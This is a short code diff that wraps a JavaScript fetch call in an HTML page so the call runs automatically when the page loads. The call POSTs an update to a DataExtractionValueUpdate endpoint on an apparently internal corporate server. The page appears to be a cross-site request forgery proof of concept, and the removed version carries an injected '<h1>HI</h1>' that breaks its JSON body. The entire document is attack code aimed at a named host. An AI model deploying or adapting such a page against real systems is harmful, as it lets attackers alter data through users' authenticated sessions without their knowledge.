@@ -1,23 +1,28 @@
-fetch("https://mykulsrv123.my.kworld.kpmg.com:8443/DataExtractionValueUpdate", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json;charset=UTF-8",
-    "X-Requested-With": "XMLHttpRequest"
-  },
-  body: JSON.stringify({
-    <h1>HI</h1>
-    "refid": "203",
-    "type": "Text Field",
-    "desc": "Company registration number 12345",
-    "datatype": "Generic String",
-    "context": "MBRS System",
-    "order": "203",
-    "mandatory": "False",
-    "status": "Active",
-    "bcaseId": "10",
-    "oldDesc": "Company registration number 123"
-  })
-})
-.then(response => response.text())
-.then(data => console.log("Response:", data))
-.catch(error => console.error("Error:", error));
+<html>
+  <body>
+    <script>
+      fetch("https://mykulsrv123.my.kworld.kpmg.com:8443/DataExtractionValueUpdate", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Requested-With": "XMLHttpRequest"
+        },
+        body: JSON.stringify({
+          "refid": "203",
+          "type": "Text Field",
+          "desc": "Company registration number 12345",
+          "datatype": "Generic String",
+          "context": "MBRS System",
+          "order": "203",
+          "mandatory": "False",
+          "status": "Active",
+          "bcaseId": "10",
+          "oldDesc": "Company registration number 123"
+        })
+      })
+      .then(response => response.text())
+      .then(data => console.log("Response:", data))
+      .catch(error => console.error("Error:", error));
+    </script>
+  </body>
+</html>
